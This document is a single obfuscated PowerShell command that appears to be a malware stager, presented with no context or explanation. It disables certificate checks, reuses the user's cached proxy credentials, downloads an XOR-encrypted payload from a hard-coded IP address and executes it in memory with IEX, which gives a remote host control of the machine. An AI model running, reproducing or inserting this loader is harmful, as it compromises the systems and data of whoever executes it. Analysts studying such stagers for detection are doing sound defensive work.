
$wc=NEW-ObJeCT SysTEm.Net.WEbCLIenT;$u='"Mozilla/4.0 (compatible; MSIE 8.0; Win32)"';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HEAdERs.ADD('User-Agent',$u);$wc.PrOXy = [SYsTeM.Net.WEbREQueST]::DEfaulTWeBPROXY;$wC.PRoXY.CrEdenTIALS = [SYsTEM.NeT.CrEDentialCachE]::DEfaULTNeTwoRkCReDeNtiaLs;$K='f5cac69586d60b98d43a2ae34d64e876';$i=0;[ChaR[]]$B=([ChAr[]]($Wc.DoWnLoADStriNg("https://66.192.70.39:443/index.asp")))|%{$_-bXor$k[$I++%$k.LEnGTH]};IEX ($B-joIN'')

